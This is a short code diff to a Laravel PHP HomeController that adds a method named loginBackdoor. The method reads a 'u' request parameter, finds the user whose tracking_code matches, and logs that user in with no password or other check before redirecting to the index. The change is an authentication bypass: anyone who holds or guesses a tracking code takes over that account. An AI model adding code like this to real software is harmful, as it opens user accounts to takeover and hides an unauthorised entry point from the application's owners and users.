@@ -29,6 +29,15 @@ class HomeController extends Controller
 		return view('index', [ 'registration_qty' => $sys_param->registration_slots_qty ]);
 	}
 
+	public function loginBackdoor(Request $request) {
+		$tracking_code = $request->input('u');
+		$user = User::where('tracking_code', $tracking_code)->first();
+		if ($user != NULL) {
+			Auth::login($user);
+		}
+		return redirect()->action('HomeController@index');
+	}
+
 	/**
 	 * Show the application dashboard.
 	 *
